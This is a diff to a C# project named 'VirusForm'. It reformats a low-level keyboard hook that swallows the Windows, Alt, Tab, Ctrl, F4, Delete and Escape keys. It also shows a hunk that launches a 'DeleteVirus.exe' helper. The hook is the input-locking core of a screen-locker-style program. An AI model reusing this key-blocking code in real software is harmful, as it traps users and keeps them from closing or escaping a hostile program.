@@ -76,24 +76,16 @@ namespace VirusForm
             if (nCode >= 0)
             {
                 KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
-         
-                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin) // Disabling Windows keys
-                {
-                    return (IntPtr)1;
-                }
-        
 
-                if (objKeyInfo.key == Keys.Alt){return (IntPtr)1;}
-                if (objKeyInfo.key == Keys.Tab) {return (IntPtr)1;}
-                if (objKeyInfo.key == Keys.LControlKey||objKeyInfo.key == Keys.RControlKey) { return (IntPtr)1; }
-                 if (objKeyInfo.key == Keys.F4) {return (IntPtr)1;}
-                 if (objKeyInfo.key == Keys.Delete) {return (IntPtr)1;}
-                 if (objKeyInfo.key == Keys.Escape) {return (IntPtr)1;}
-                 if (objKeyInfo.key == Keys.Pause) {return (IntPtr)1;}
-                 if (objKeyInfo.key == Keys.LMenu) {return (IntPtr)1;}
-
-
-
+                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin) { return (IntPtr)1; }
+                if (objKeyInfo.key == Keys.Alt) { return (IntPtr)1; }
+                if (objKeyInfo.key == Keys.Tab) { return (IntPtr)1; }
+                if (objKeyInfo.key == Keys.LControlKey || objKeyInfo.key == Keys.RControlKey) { return (IntPtr)1; }
+                if (objKeyInfo.key == Keys.F4) { return (IntPtr)1; }
+                if (objKeyInfo.key == Keys.Delete) { return (IntPtr)1; }
+                if (objKeyInfo.key == Keys.Escape) { return (IntPtr)1; }
+                if (objKeyInfo.key == Keys.Pause) { return (IntPtr)1; }
+                if (objKeyInfo.key == Keys.LMenu) { return (IntPtr)1; }
             }
             return CallNextHookEx(ptrHook, nCode, wp, lp);
         }
@@ -144,7 +136,6 @@ namespace VirusForm
                     Process dv = new Process();
                     dv.StartInfo.FileName = VirusForm.Form1.needPatch + "DeleteVirus.exe";
                     dv.Start();
-
                 }
                 catch { }
             }
